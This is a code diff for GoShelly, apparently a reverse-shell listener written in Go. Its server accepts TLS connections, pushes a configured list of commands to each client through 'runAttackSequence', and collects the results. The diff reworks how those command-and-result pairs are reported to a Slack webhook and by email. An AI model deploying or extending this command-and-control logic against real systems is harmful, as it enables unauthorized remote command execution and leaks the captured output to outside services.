@@ -20,7 +20,6 @@ import (
 	"os/exec"
 	"strings"
 	"time"
-	//aws//
 )
 
 func handleError(err error) {
@@ -88,27 +87,37 @@ func validateMailAddress(address string) {
 	servlog.Println("Email Verified. True.")
 }
 
-func sendSlackMessage(conn net.Conn, connData []t.ComRes) {
+var temp []t.SlackSchemaOne
+
+func sendSlackMessage(conn net.Conn, connData []t.SlackSchemaOne) {
 	if !CONFIG.SLACKEN {
 		return
 	}
+
 	servlog.Println("Notifying Slack.")
+	temp = append(temp, t.SlackSchemaOne{Type: "context", Elements: []t.SlackSchemaTwo{{
+		Type: "mrkdwn",
+		Text: "GoShelly Results: " + conn.RemoteAddr().String(),
+	},
+	}}, t.SlackSchemaOne{Type: "context", Elements: []t.SlackSchemaTwo{{
+		Type: "mrkdwn",
+		Text: "Connection received, ID: " + conn.RemoteAddr().String() + "-" + time.Now().Format(time.RFC1123),
+	},
+	}})
 
-	newPost := t.SlackPost{
-		Id:    conn.RemoteAddr().String() + "-" + time.Now().Format(time.RFC1123),
-		Title: "New connection received: " + conn.RemoteAddr().String(),
-		Data:  connData,
-	}
+	temp = append(temp, connData...)
 
-	body, _ := json.Marshal(newPost)
+	body, _ := json.Marshal(t.SlackSchemaThree{Blocks: temp})
 
 	resp, err := http.Post(CONFIG.SLACKHOOK, "application/json", bytes.NewBuffer(body))
-
-	if err == nil && resp.StatusCode == http.StatusCreated {
-		servlog.Println("Slack Notification sent successfully, ID:", newPost.Id)
+	if err == nil && resp.StatusCode == http.StatusOK {
+		servlog.Println("Slack Notification sent successfully, ID: ", conn.RemoteAddr().String()+"-"+time.Now().Format(time.RFC1123))
+		// fmt.Println(string(body),resp.StatusCode)
 		resp.Body.Close()
+
 		return
 	}
+	// fmt.Println(string(body),resp.StatusCode)
 	servlog.Println("ERROR: ", err)
 	servlog.Printf("HTTPSTATUSCODE: %d. Could not send Slack notification. Disabling Slack notifications until restart.", resp.StatusCode)
 	CONFIG.SLACKEN = false
@@ -139,7 +148,7 @@ func handleClient(conn net.Conn) {
 	data := runAttackSequence(conn, logger)
 	disconnectClient(conn, logger, *file)
 	err = n.SendEmail(conn, CONFIG.EMAILEN, CONFIG.NOTEMAIL, servlog)
-	if err != nil{
+	if err != nil {
 		CONFIG.EMAILEN = false
 	}
 	sendSlackMessage(conn, data)
@@ -159,9 +168,9 @@ func setWriteDeadLine(conn net.Conn) {
 	}
 }
 
-func runAttackSequence(conn net.Conn, logger *log.Logger) []t.ComRes {
+func runAttackSequence(conn net.Conn, logger *log.Logger) []t.SlackSchemaOne {
 	buffer := make([]byte, 1024)
-	var data []t.ComRes
+	var data []t.SlackSchemaOne
 	for _, element := range CONFIG.CMDSTORUN {
 		element = strings.TrimSpace(element)
 		encodedStr := base64.StdEncoding.EncodeToString([]byte(element))
@@ -179,7 +188,15 @@ func runAttackSequence(conn net.Conn, logger *log.Logger) []t.ComRes {
 		}
 		decodedStr, _ := base64.StdEncoding.DecodeString(string(buffer[:]))
 		logger.Println("RES: " + string(decodedStr[:]))
-		data = append(data, t.ComRes{Cmd: element, Res: string(decodedStr[:])})
+		data = append(data, t.SlackSchemaOne{Type: "context", Elements: []t.SlackSchemaTwo{{
+			Type: "mrkdwn",
+			Text: "CMD: " + element,
+		},
+		}}, t.SlackSchemaOne{Type: "context", Elements: []t.SlackSchemaTwo{{
+			Type: "mrkdwn",
+			Text: "RES: " + string(decodedStr[:]),
+		},
+		}})
 	}
 	return data
 }
@@ -218,7 +235,7 @@ func StartServer(port string, sslEmail string, not_email string, hook_slack stri
 	printConfig()
 
 	genCert() // Uncomment if NOT using image.
-	servlog.Println("Loading SSL Certificates")
+	//servlog.Println("Loading SSL Certificates")
 	cert, err := tls.LoadX509KeyPair("certs/server.pem", "certs/server.key")
 
 	if err != nil {
@@ -242,7 +259,7 @@ func StartServer(port string, sslEmail string, not_email string, hook_slack stri
 			servlog.Printf("%s Client accept error: %s", conn.RemoteAddr(), err)
 			continue
 		}
-		servlog.Printf("Client accepted: %s", conn.RemoteAddr())
+		servlog.Printf("Client accepted: %s\n", conn.RemoteAddr().String())
 		tlscon, ok := conn.(*tls.Conn)
 		if ok {
 			servlog.Print("SSL ok=true")
